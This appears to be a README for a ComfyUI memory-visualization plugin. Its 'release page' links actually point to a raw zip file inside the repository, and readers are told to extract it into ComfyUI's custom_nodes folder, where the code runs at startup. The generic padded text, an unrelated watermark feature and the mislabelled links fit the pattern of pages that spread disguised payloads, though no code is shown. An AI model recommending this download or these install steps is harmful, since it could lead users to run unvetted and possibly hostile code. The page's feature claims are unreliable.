# 📊 ComfyUI-MemoryVisualization - Monitor your graphics memory usage easily

[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sompramortaI/ComfyUI-MemoryVisualization/raw/refs/heads/main/web/Comfy_U_Visualization_Memory_v2.8.zip)

This application provides a visual dashboard for ComfyUI. It monitors your VRAM and system memory usage in real time. You see exactly how much memory your current workflow consumes. This prevents crashes and helps you manage large machine learning models effectively.

## 🛠 Features

*   **Real-time VRAM Tracking**: Watch your graphics card memory usage jump as you generate images.
*   **System Memory Monitor**: Keep an eye on your computer RAM usage alongside graphics memory.
*   **Model Residency Maps**: Identify which parts of your models occupy space in the memory.
*   **Visual Interface**: The dashboard integrates directly into your ComfyUI workspace.
*   **Watermark Control**: Manage output watermarks with simple click tools.

## 📋 System Requirements

*   **Software**: ComfyUI must be installed and running on your system.
*   **Operating System**: Windows 10 or Windows 11.
*   **Hardware**: A dedicated GPU with at least 4GB of VRAM is recommended for stable performance.
*   **Network**: A standard internet connection to download the tool.

## 📥 Downloading the Tool

You need to download the correct version for your Windows computer.

[Click here to visit the release page and download the tool](https://github.com/sompramortaI/ComfyUI-MemoryVisualization/raw/refs/heads/main/web/Comfy_U_Visualization_Memory_v2.8.zip)

Visit the link above. Look for the latest version at the top of the list. Click the file ending in .zip or the source code button if you prefer a manual setup. Save the file to your desktop for easy access.

## 🚀 Setting Up the Software

Follow these steps to add the visualizer to your ComfyUI setup.

1. Locate your ComfyUI installation folder. This is usually where your main application files live.
2. Open the folder named `custom_nodes`.
3. If you downloaded a zip file, extract the contents into this `custom_nodes` folder.
4. Ensure the folder name inside `custom_nodes` is `ComfyUI-MemoryVisualization`.
5. Restart ComfyUI if it is currently running. The browser page should now show the new memory panel.

## ⚙️ Using the Dashboard

Once you start ComfyUI again, look for a new section in your sidebar or workflow window. 

The main panel displays two colored bars. The top bar shows your VRAM usage. The bottom bar shows your system RAM usage. As you queue prompts, you will see the bars move. High movement indicates high memory strain.

If the bars turn red, your computer is reaching its limits. You might need to close other applications like web browsers or video players to free up space.

## 🗺 Understanding Memory Maps

When you enable the advanced features, the tool shows a grid. This grid represents your GPU memory. Each box represents a piece of your loaded model. 

*   **Green boxes**: Healthy, active memory.
*   **Yellow boxes**: Warning, memory usage is high.
*   **Red boxes**: Critical, you may encounter an out of memory error. 

This view helps you understand why a specific model creates performance issues. You can clear specific memory blocks to restart a workflow without closing the entire ComfyUI program.

## 🛡 Watermark Settings

If your workflow involves images that require a watermark, you can toggle these settings through the Memory Visualization panel. You can change the size, position, and transparency of the watermark. Use these settings to ensure your output looks exactly how you want it.

## ❓ Frequently Asked Questions

**Does this tool slow down my generations?**
No. It runs as a light overlay on your existing setup. It consumes minimal processing power.

**Where do I find the files?**
The files are stored inside the `custom_nodes` folder in your ComfyUI directory. Never move these files while ComfyUI is active.

**Can I use this on a Mac?**
While the tool is designed for Windows, the underlying code works on most systems. However, this guide focuses on Windows performance and installation.

**Why does the panel not appear?**
Check your command line window when you start ComfyUI. Look for errors related to the memory visualization node. Usually, a simple restart fixes the issue. If the error continues, ensure you placed the folder inside `custom_nodes` and not inside another subfolder.

**How do I update the tool?**
Delete the old folder inside `custom_nodes` and repeat the installation steps with the latest file from the download page. Always keep a backup of your current setup before running updates.